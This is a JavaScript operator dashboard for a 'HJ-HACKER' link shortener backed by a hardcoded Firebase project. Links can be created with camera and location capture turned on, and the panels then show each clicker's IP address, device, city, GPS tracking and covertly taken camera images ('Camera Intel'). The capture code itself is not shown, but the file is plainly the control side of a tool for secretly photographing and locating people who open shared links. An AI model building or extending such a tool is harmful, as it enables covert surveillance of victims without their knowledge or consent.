// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// Main Shorten Function
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" already taken`, 'error');
        return;
    }
    
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0
        };
        
        if (cameraCapture) linkData.capture_camera = true;
        if (locationCapture) linkData.capture_location = true;
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        
        const shortLinkSpan = document.getElementById('shortLink');
        const resultDiv = document.getElementById('result');
        const qrCodeDiv = document.getElementById('qrCode');
        
        if (shortLinkSpan) shortLinkSpan.textContent = shortUrl;
        if (resultDiv) resultDiv.classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined' && qrCodeDiv) {
            qrCodeDiv.innerHTML = '';
            new QRCode(qrCodeDiv, {
                text: shortUrl,
                width: 100,
                height: 100,
                colorDark: "#00ff41",
                colorLight: "#000000"
            });
        }
        
        // Save to localStorage
        const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
        recent.unshift({ code: shortCode, longUrl: urlToShorten, shortUrl: shortUrl, date: createdAt });
        localStorage.setItem('hj_recent_links', JSON.stringify(recent.slice(0, 10)));
        
        showToast('Success', 'Link created!', 'success');
        
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        
        // Refresh panels
        loadLinksData();
        loadMediaData();
        loadStatsData();
        loadRecentDataPanel();
        
    } catch (error) {
        console.error('Error:', error);
        showToast('Error', error.message || 'An error occurred', 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== 4 BUTTONS DATA FUNCTIONS ==========

// Tab switching
document.querySelectorAll('.data-tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tabName = btn.dataset.dataTab;
        document.querySelectorAll('.data-tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        document.querySelectorAll('.data-panel').forEach(panel => panel.classList.add('hidden'));
        document.getElementById(`${tabName}Panel`).classList.remove('hidden');
        
        if (tabName === 'links') loadLinksData();
        if (tabName === 'media') loadMediaData();
        if (tabName === 'stats') loadStatsData();
        if (tabName === 'recent-data') loadRecentDataPanel();
    });
});

// LINKS Panel
async function loadLinksData() {
    const container = document.getElementById('linksList');
    if (!container) return;
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p></div>`;
            return;
        }
        
        container.innerHTML = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code">/${link.code}</span>
                    <span class="data-item-date">${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url">${link.long_url?.substring(0, 50)}...</div>
                <div class="data-item-stats">
                    <span>📊 Clicks: ${link.clicks || 0}</span>
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> View Data</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading</p></div>`;
    }
}

// MEDIA Panel
async function loadMediaData() {
    const container = document.getElementById('mediaList');
    if (!container) return;
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allMedia = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(30).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                if (data.captured_image) {
                    allMedia.push({ code: code, image: data.captured_image, timestamp: data.created_at });
                }
            });
        }
        
        if (allMedia.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-camera"></i><p>No camera captures</p></div>`;
            return;
        }
        
        container.innerHTML = allMedia.map(media => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code">/${media.code}</span>
                    <span class="data-item-date">${new Date(media.timestamp).toLocaleString()}</span>
                </div>
                ${media.image ? `<img src="${media.image}" class="media-image">` : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${media.code}')">View Full Data</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>`;
    }
}

// STATS Panel
async function loadStatsData() {
    const container = document.getElementById('statsPanelContent');
    if (!container) return;
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0, totalCamera = 0;
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
            const analyticsSnapshot = await database.ref(`analytics/${code}`).get();
            analyticsSnapshot.forEach(a => { if (a.val().captured_image) totalCamera++; });
        }
        
        container.innerHTML = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label">Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${totalCamera}</div><div class="stat-label">Camera Intel</div></div>
            </div>
            <div class="empty-data"><p>Click "View Data" on any link for details</p></div>
        `;
    } catch (error) {
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading stats</p></div>`;
    }
}

// RECENT Panel
async function loadRecentDataPanel() {
    const container = document.getElementById('recentDataList');
    if (!container) return;
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const allVisitors = [];
        
        for (const [code] of Object.entries(snapshot.val() || {})) {
            const analyticsSnapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(15).get();
            analyticsSnapshot.forEach(analytic => {
                const data = analytic.val();
                allVisitors.push({ code: code, ip: data.ip_address, timestamp: data.created_at, camera: data.captured_image });
            });
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 15);
        
        if (recent.length === 0) {
            container.innerHTML = `<div class="empty-data"><i class="fas fa-clock"></i><p>No recent activity</p></div>`;
            return;
        }
        
        container.innerHTML = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code">/${v.code}</span>
                    <span class="data-item-date">${new Date(v.timestamp).toLocaleString()}</span>
                </div>
                <div class="data-item-stats">🌐 IP: ${v.ip || 'Unknown'}</div>
                ${v.camera ? '<div class="data-item-stats" style="color:#00ff41;">📸 Camera captured!</div>' : ''}
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')">View Full Data</button>
                </div>
            </div>
        `).join('');
    } catch (error) {
        container.innerHTML = `<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>`;
    }
}

// View Analytics - Shows data in current panel
window.viewAnalytics = async (code) => {
    showToast('Loading', `Fetching data for /${code}...`, 'success');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).orderByKey().limitToLast(50).get();
        const analytics = [];
        snapshot.forEach(child => { analytics.push({ id: child.key, ...child.val() }); });
        analytics.reverse();
        
        const totalClicks = analytics.length;
        const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
        const cameras = analytics.filter(a => a.captured_image).length;
        const locations = analytics.filter(a => a.latitude).length;
        
        // Switch to STATS tab and show data there
        const statsTab = document.querySelector('[data-data-tab="stats"]');
        if (statsTab) statsTab.click();
        
        const statsContainer = document.getElementById('statsPanelContent');
        if (statsContainer) {
            statsContainer.innerHTML = `
                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label">Total Clicks</div></div>
                    <div class="stat-card"><div class="stat-value">${uniqueIPs}</div><div class="stat-label">Unique Visitors</div></div>
                    <div class="stat-card"><div class="stat-value">${cameras}</div><div class="stat-label">Camera Intel</div></div>
                    <div class="stat-card"><div class="stat-value">${locations}</div><div class="stat-label">GPS Tracked</div></div>
                </div>
                <h4 style="margin: 10px 0 6px; font-size: 0.75rem;">Visitors for /${code}</h4>
                ${analytics.map(v => `
                    <div class="data-item">
                        <div class="data-item-header">
                            <span>🌐 ${v.ip_address || 'Unknown'}</span>
                            <span class="data-item-date">${new Date(v.created_at).toLocaleString()}</span>
                        </div>
                        <div class="data-item-stats">📱 ${v.device_type || 'Unknown'} | 🌐 ${v.browser || 'Unknown'}</div>
                        ${v.city ? `<div class="data-item-stats">📍 ${v.city}, ${v.country || ''}</div>` : ''}
                        ${v.captured_image ? '<div style="color:#00ff41; font-size:0.65rem;">📸 Camera captured!</div>' : ''}
                    </div>
                `).join('')}
            `;
        }
        
        showToast('Success', `${analytics.length} visitor records loaded!`, 'success');
    } catch (error) {
        showToast('Error', 'Failed to load data', 'error');
    }
};

// Copy function
window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// Bottom Navigation
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
        } else if (tab === 'links-bottom') {
            const linksTab = document.querySelector('[data-data-tab="links"]');
            if (linksTab) linksTab.click();
            document.getElementById('linksPanel').scrollIntoView({ behavior: 'smooth' });
        } else if (tab === 'stats-bottom') {
            const statsTab = document.querySelector('[data-data-tab="stats"]');
            if (statsTab) statsTab.click();
            document.getElementById('statsPanel').scrollIntoView({ behavior: 'smooth' });
        } else if (tab === 'recent-bottom') {
            const recentTab = document.querySelector('[data-data-tab="recent-data"]');
            if (recentTab) recentTab.click();
            document.getElementById('recentDataPanel').scrollIntoView({ behavior: 'smooth' });
        }
    });
});

// Advanced Intelligence Toggle
const advancedToggle = document.getElementById('advancedToggle');
if (advancedToggle) {
    advancedToggle.addEventListener('click', () => {
        const content = document.getElementById('advancedContent');
        const icon = document.querySelector('#advancedToggle .fa-chevron-down');
        content.classList.toggle('hidden');
        if (icon) icon.style.transform = content.classList.contains('hidden') ? 'rotate(0deg)' : 'rotate(180deg)';
    });
}

// Event Listeners
const shortenBtn = document.getElementById('shortenBtn');
if (shortenBtn) shortenBtn.addEventListener('click', shortenUrl);

const copyBtn = document.getElementById('copyBtn');
if (copyBtn) {
    copyBtn.addEventListener('click', () => {
        const link = document.getElementById('shortLink')?.textContent;
        if (link) copyToClipboard(link);
    });
}

// Initialize
setTimeout(() => {
    loadLinksData();
    loadMediaData();
    loadStatsData();
    loadRecentDataPanel();
}, 500);

console.log('🔥 HJ-HACKER Loaded!');
